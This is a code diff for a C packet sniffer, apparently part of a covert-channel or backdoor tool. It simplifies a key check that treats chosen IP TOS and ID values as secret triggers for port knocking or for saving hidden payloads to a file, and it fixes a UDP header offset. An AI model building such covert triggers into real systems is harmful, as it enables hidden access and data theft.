@@ -84,11 +84,12 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
         printf("TOS: %c\n", ip->ip_tos);
         printf("TTL: %c\n", ip->ip_ttl);
         printf("Infected: %d\n", Filter->infected);
-        if(CheckKey(ip->ip_tos, ip->ip_id, true, false)){
+        if(CheckKey(ip->ip_tos, ip->ip_id, true)){
             //port knocking packet
             const struct sniff_udp *udp;
             int size_udp;
-            udp = (struct sniff_udp*)(packet + 14 + length);
+            int size_ip = IP_HL(ip);
+            udp = (struct sniff_udp*)(packet + 14 + size_ip);
             size_udp = 8;
             printf("Src port: %d\n", ntohs(udp->uh_sport));
             printf("Dst port: %d\n", ntohs(udp->uh_dport));
@@ -153,7 +154,7 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
             printf("EXIT LOOP");
             pcap_breakloop(interfaceinfo);
     }
-        if(CheckKey(ip->ip_tos, ip->ip_id, false, false)){
+        if(CheckKey(ip->ip_tos, ip->ip_id, false)){
             //normal packet
             FILE *file;
             if((file = fopen(FILENAME, "a+b")) < 0){
@@ -201,10 +202,10 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
         printf("Protocal: TCP\n");
         printf("IPID: %hu\n", ip->ip_id);
         printf("TOS: %u\n", ip->ip_tos);
-        if(CheckKey(ip->ip_tos, ip->ip_id, false, true)){
+        if(CheckKey(ip->ip_tos, ip->ip_id, false)){
             printf("Reading payload\n");
             ParseTCP(Filter, pkthdr, packet);
-        } else if(CheckKey(ip->ip_tos, ip->ip_id,true, true)) {
+        } else if(CheckKey(ip->ip_tos, ip->ip_id,true)) {
             //change to port knocking
             //ParsePattern(args,pkthdr, packet);
             PortKnocking(Filter, pkthdr, packet, false, false);
@@ -214,40 +215,21 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
     }
     }
 
-bool CheckKey(u_char ip_tos, u_short ip_id, bool knock, bool tcp){
-    if(tcp){
-        if(knock){
-            //check if the key is right for port knocking
-            if(ip_tos == 'b' && ip_id == 'l'){
-                return true;
-            } else {
-                return false;
-            }
+bool CheckKey(u_char ip_tos, u_short ip_id, bool knock){
+    if(knock){
+        //check if the key is right for port knocking
+        if(ip_tos == 'b' && ip_id == 'l'){
+            return true;
         } else {
-            // check if key is right for normal packets
-            if(ip_tos == 'l' && ip_id == 'b'){
-                return true;
-            } else {
-                return false;
-            }
+            return false;
         }
     } else {
-        if(knock){
-            //check if the key is right for port knocking
-            if(ip_tos == 'b' && ip_id == 'l'){
-                return true;
-            } else {
-                return false;
-            }
+        // check if key is right for normal packets
+        if(ip_tos == 'l' && ip_id == 'b'){
+            return true;
         } else {
-            // check if key is right for normal packets
-            if(ip_tos == 'l' && ip_id == 'b'){
-                return true;
-            } else {
-                return false;
-            }
-
-    }
+            return false;
+        }
     }
 }
 
